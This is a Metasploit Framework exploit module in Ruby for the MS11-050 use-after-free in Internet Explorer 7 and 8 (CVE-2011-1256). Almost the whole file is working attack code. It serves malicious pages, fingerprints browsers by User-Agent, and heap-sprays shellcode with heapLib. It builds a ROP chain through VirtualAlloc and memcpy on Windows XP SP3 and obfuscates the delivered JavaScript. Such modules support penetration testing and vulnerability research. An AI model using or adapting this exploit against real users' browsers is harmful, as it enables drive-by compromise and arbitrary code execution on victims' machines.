# $Id: ms11_050_mshtml_cobjectelement.rb 12962 2011-06-17 01:56:20Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::BrowserAutopwn
    autopwn_info({
        :ua_name    => HttpClients::IE,
        :ua_minver  => "7.0",
        :ua_maxver  => "8.0",
        :javascript => true,
        :os_name    => OperatingSystems::WINDOWS,
        :vuln_test  => nil,
    })
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "MS11-050 IE mshtml!CObjectElement Use After Free",
            &#039;Description&#039;    => %q{
                    This module exploits a use-after-free vulnerability in Internet Explorer. The
                vulnerability occurs when an invalid <object> tag exists and other elements overlap/cover
                where the object tag should be when rendered (due to their styles/positioning). The
                mshtml!CObjectElement is then freed from memory because it is invalid. However, the
                mshtml!CDisplay object for the page continues to keep a reference to the freed <object> and
                attempts to call a function on it, leading to the use-after-free.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 12962 $",
            &#039;Author&#039;         =>
                [
                    &#039;d0c_s4vage&#039;,
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-1256&#039;],
                    [&#039;OSVDB&#039;, &#039;72948&#039;],
                    [&#039;MSB&#039;, &#039;MS11-050&#039;],
                    [&#039;URL&#039;, &#039;http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 500,
                    &#039;BadChars&#039; => "\x00\x09\x0a\x0d&#039;\\",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, { } ],
 
                    # In IE6 the mshtml!CObjectElement size is 0xac
                    [
                        &#039;Win XP SP3 Internet Explorer 7&#039;, # 7.0.5730.13
                        {
                            # sizeof(mshtml!CObjectElement)
                            &#039;FreedObjSize&#039; =>  0xb0,
                            &#039;FakeObjCount&#039; => 0x4000,
                            &#039;FakeObjCountKeep&#039; => 0x2000,
                            &#039;ForLoopNumObjects&#039; => 3,
                            &#039;FreedObjOverwritePointer&#039;=>0x0c0c0c0c,
                            &#039;FreedObjOffsetAlignSize&#039;=>0,
                            &#039;ROP&#039; => false,
                        }
                    ],
 
                    [
                        &#039;Win XP SP3 Internet Explorer 8 (no DEP)&#039;, # 8.0.6001.18702
                        {
                            # sizeof(mshtml!CObjectElement)
                            &#039;FreedObjSize&#039; =>  0xe0, # 0xdc rounded up
                            &#039;FakeObjCount&#039; => 0x8000,
                            &#039;FakeObjCountKeep&#039; => 0x3000,
                            &#039;ForLoopNumObjects&#039; => 5,
                            &#039;FreedObjOverwritePointer&#039;=>0x0c0c0c0c,
                            &#039;FreedObjOffsetAlignSize&#039;=>0,
                            &#039;ROP&#039; => false,
                        }
                    ],
 
                    [
                        &#039;Win XP SP3 Internet Explorer 8&#039;,
                        {
                            &#039;FreedObjSize&#039; =>  0xe0, # 0xdc rounded up
                            &#039;FakeObjCount&#039; => 0x8000,
                            &#039;FakeObjCountKeep&#039; => 0x3000,
                            &#039;ForLoopNumObjects&#039; => 5,
                            &#039;FreedObjOverwritePointer&#039;=>0x0c0c0c0c,
                            &#039;FreedObjOffsetAlignSize&#039;=>2,
                            #&#039;StackPivot&#039;=>0x773E3F18, # xchg eax,esp / ret - comctl32.dll
                            &#039;StackPivot&#039; => 0x7E45F257, #xchg eax,esp - USER32.dll
                            &#039;ROP&#039; => true,
                        }
                    ],
 
                    [
                        &#039;Debug Target (Crash)&#039;, {}
                    ],
                ],
            &#039;DisclosureDate&#039; => "Jun 16 2011",
            &#039;DefaultTarget&#039;  => 0))
    end
 
    def auto_target(cli, request)
        agent = request.headers[&#039;User-Agent&#039;]
        if agent =~ /MSIE 8\.0/
            mytarget = targets[3] # IE 8
        elsif agent =~ /MSIE 7\.0/
            mytarget = targets[1]
        else
            print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
        end
 
        mytarget
    end
 
 
    # 3/22/2011
    # fully patched x32 WinXP SP3, IE 8.0.6001.18702
    def winxp_sp3_rva
        {
            #"kernel32!VirtualAlloc"  => 0x7c809af1,
            "kernel32!VirtualAlloc" => 0x7c809ae1,
            "ntdll!memcpy"           => 0x7c901db3,
        }
    end
 
    def compile_rop(rop_stack)
        rva = winxp_sp3_rva()
        num_random = 0
        rop_stack.map do |rop_val|
            case rop_val
            when String
                if rop_val == "random"
                    # useful for debugging
                    # num_random += 1
                    # 0xaabbcc00 + num_random
                    rand(0xffffffff)
                else
                    raise RuntimeError, "Unable to locate key: #{rop_val.inspect}" unless rva[rop_val]
                    rva[rop_val]
                end
            when Integer
                rop_val
            else
                raise RuntimeError, "unknown rop_val: #{rop_val.inspect}, #{rop_val.class}"
            end
        end.pack("V*")
    end
 
    def on_request_uri(cli, request)
        mytarget = target
        if target.name == &#039;Automatic&#039;
            mytarget = auto_target(cli, request)
            unless mytarget
                send_not_found(cli)
                return
            end
        end
        @mytarget = mytarget
        @debug = true if mytarget == targets[4]
 
        return if ((p = regenerate_payload(cli)) == nil)
         
        id_name  = rand_text_alpha(5)
        dir_name = rand_text_alpha(3)
 
        if @debug
            data = <<-DATA
            <html>
            <body>
            <script language=&#039;javascript&#039;>
            document.body.innerHTML += "<object align=&#039;right&#039; hspace=&#039;1000&#039; width=&#039;1000&#039;></object>";
            document.body.innerHTML += "<a id=&#039;#{id_name}&#039; style=&#039;bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px&#039; ></a>";
            document.body.innerHTML += "AAAAAAA";
            document.body.innerHTML += "<strong style=&#039;font-size:1000pc;margin:auto -1000cm auto auto;&#039; dir=&#039;#{dir_name}&#039;></strong>";
            </script>
            </body>
            </html>
            DATA
 
            print_status("Triggering #{self.name} vulnerability at #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")
            send_response(cli, data, { &#039;Content-Type&#039; => &#039;text/html&#039; })
            return
        end
 
        raw_shellcode = payload.encoded
        shellcode = Rex::Text.to_unescape(raw_shellcode, Rex::Arch.endian(mytarget.arch))
 
        spray = nil
        rop_shellcode_spray = nil
 
        obj_overwrite_ptr = [@mytarget[&#039;FreedObjOverwritePointer&#039;]].pack("V")
 
        if @mytarget[&#039;ROP&#039;]
            rop_stack = []
            0x1f.times do |i|
                rop_stack << "random"
            end
 
            idx = -1
            idx += 1 ; rop_stack[idx] = "kernel32!VirtualAlloc"   # 1:
            idx += 1 ; rop_stack[idx] = "ntdll!memcpy"            # 2:ret 10 to this after VirtualAlloc
            idx += 1 ; rop_stack[idx] = 0x7f000000                # 1:VirtualAlloc:lpAddress
            idx += 1 ; rop_stack[idx] = 0x4000                    # 1:VirtualAlloc:dwSize
            idx += 1 ; rop_stack[idx] = (0x1000 | 0x2000)         # 1:VirtualAlloc:flAllocationType MEM_COMMIT | MEM_RESERVE
            idx += 1 ; rop_stack[idx] = 0x40                      # 1:VirtualAlloc:flProtect rwx
            idx += 1 ; rop_stack[idx] = 0x7f001000                # 3:into this after memcpy
            idx += 1 ; rop_stack[idx] = 0x7f001000                # 2:memcpy:dst
            idx += 1 ; rop_stack[idx] = 0x23000100                # 2:memcpy:src
            idx += 1 ; rop_stack[idx] = 0x2fff                    # 2:memcpy:size
 
            # align the rest of it
            back = rop_stack.slice!((rop_stack.length-1)-2, rop_stack.length)
            rop_stack = back + rop_stack
 
            rop_stack << @mytarget[&#039;StackPivot&#039;]
 
            # align the stack for 0c0c0c0c
            front = rop_stack.slice!(0, 19)
            rop_stack = rop_stack + front
 
            # resolve strings in the rop_stack array (kernel32!VirtualAlloc, random, etc)
            rop = compile_rop(rop_stack)
 
            nops = make_nops(0x1000 - raw_shellcode.length)
            nops = Rex::Text.to_unescape(nops, Rex::Arch.endian(mytarget.arch))
 
            #spray up to 0x23000000
            rop_shellcode_spray = <<-JS
            var shellcode = unescape("#{shellcode}");
            var nops = unescape("#{nops}");
            while(nops.length < 0x1000) nops += nops;
                var shell_heapblock = nops.substring(0, 0x800-shellcode.length) + shellcode;
                while(shell_heapblock.length < 0x40000) shell_heapblock += shell_heapblock;
                    var shell_finalspray = shell_heapblock.substring(0, (0x20000-6)/2);
                    for(var shell_counter = 0; shell_counter < 0x1000; shell_counter++) { heap_obj.alloc(shell_finalspray); }
            JS
 
            spray = rop
            shellcode = ""
        else
            spray = obj_overwrite_ptr
        end
 
        spray = Rex::Text.to_unescape(spray, Rex::Arch.endian(mytarget.arch))
 
        js = <<-JS
        heap_obj = new heapLib.ie(0x20000);
        var heapspray = unescape("#{spray}");
        while(heapspray.length < 0x1000) heapspray += heapspray;
            var shellcode = unescape("#{shellcode}");
            var heapblock = heapspray.substring(0, (0x800-shellcode.length)) + shellcode;
            var offset = #{[targets[1], targets[2]].include?(@mytarget) ? "0x400" : "0"};
            var front = heapblock.substring(0, offset);
            var end = heapblock.substring(offset);
            heapblock = end + front;
            while(heapblock.length < 0x20000) heapblock += heapblock;
                finalspray = heapblock.substring(0, (0x10000-6)/2);
                for(var counter1 = 0; counter1 < 0x1000; counter1++) { heap_obj.alloc(finalspray); }
 
                #{rop_shellcode_spray}
 
                var obj_overwrite = unescape("#{Rex::Text.to_unescape(obj_overwrite_ptr, Rex::Arch.endian(mytarget.arch))}");
                while(obj_overwrite.length < #{@mytarget[&#039;FreedObjSize&#039;]}) { obj_overwrite += obj_overwrite; }
                obj_overwrite = obj_overwrite.slice(0, (#{@mytarget[&#039;FreedObjSize&#039;]}-6)/2);
 
                for(var num_objs_counter = 0; num_objs_counter < #{@mytarget[&#039;ForLoopNumObjects&#039;]}; num_objs_counter++) {
                    document.body.innerHTML += "<object align=&#039;right&#039; hspace=&#039;1000&#039; width=&#039;1000&#039;>TAG_1</object>";
                }
 
                for(var counter4 = 0; counter4 < #{@mytarget[&#039;FakeObjCountKeep&#039;]}; counter4++) { heap_obj.alloc(obj_overwrite, "keepme1"); }
                for(var counter5 = 0; counter5 < #{@mytarget[&#039;FakeObjCountKeep&#039;]}; counter5++) { heap_obj.alloc(obj_overwrite, "keepme2"); }
 
                document.body.innerHTML += "<a id=&#039;tag_3&#039; style=&#039;bottom:200cm;float:left;padding-left:-1000px;border-width:2000px;text-indent:-1000px&#039; >TAG_3</a>";
                document.body.innerHTML += "AAAA";
                document.body.innerHTML += "<strong style=&#039;font-size:1000pc;margin:auto -1000cm auto auto;&#039; dir=&#039;ltr&#039;>TAG_11</strong>";
        JS
 
        js = heaplib(js)
        js = ::Rex::Exploitation::JSObfu.new(js)
        js.obfuscate
 
        html = <<-HTML
        <html>
        <body>
        <script language=&#039;javascript&#039;>
        #{js}
        </script>
        </body>
        </html>
        HTML
 
        print_status("Sending exploit for #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")
 
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
end



